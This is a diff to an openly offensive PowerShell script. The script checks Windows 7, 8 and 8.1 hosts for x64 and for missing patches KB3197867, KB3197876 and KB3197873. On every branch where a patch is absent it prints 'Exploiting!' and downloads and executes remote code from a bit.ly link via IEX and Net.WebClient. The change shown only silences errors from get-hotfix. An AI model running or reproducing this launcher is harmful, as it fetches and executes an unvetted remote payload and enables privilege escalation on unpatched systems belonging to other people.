@@ -22,20 +22,20 @@ switch ($OSMajorMinor)
 	{
 		echo "[?] Target is Win 8.1"
 		echo "[+] Checking if x64 and for KB3197873 patch"
-		if((!([System.IntPtr]::Size -ne 8)) -And (!(get-hotfix -id KB3197873))){"[!] Exploiting!";IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/2oQYZ1H')}else{"[x] Not Exploitable!"}
+		if((!([System.IntPtr]::Size -ne 8)) -And (!(get-hotfix -id KB3197873 -ea 0))){"[!] Exploiting!";IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/2oQYZ1H')}else{"[x] Not Exploitable!"}
 	}
 
 	'6.2' # Win8 / 2k12
 	{
 		echo "[?] Target is Win 8"
 		echo "[+] Checking x64 and for KB3197876 patch"
-		if((!([System.IntPtr]::Size -ne 8)) -And (!(get-hotfix -id KB3197876))){"[!] Exploiting!";IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/2oQYZ1H')}else{"[x] Not Exploitable!"}
+		if((!([System.IntPtr]::Size -ne 8)) -And (!(get-hotfix -id KB3197876 -ea 0))){"[!] Exploiting!";IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/2oQYZ1H')}else{"[x] Not Exploitable!"}
 	}
 
 	'6.1' # Win7 / 2k8R2
 	{
 		echo "[?] Target is Win 7"
 		echo "[+] Checking x64 and for KB3197867 patch"
-		if((!([System.IntPtr]::Size -ne 8)) -And (!(get-hotfix -id KB3197867))){"[!] Exploiting!";IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/2oQYZ1H')}else{"[x] Not Exploitable!"}
+		if((!([System.IntPtr]::Size -ne 8)) -And (!(get-hotfix -id KB3197867 -ea 0))){"[!] Exploiting!";IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/2oQYZ1H')}else{"[x] Not Exploitable!"}
 	}
 }
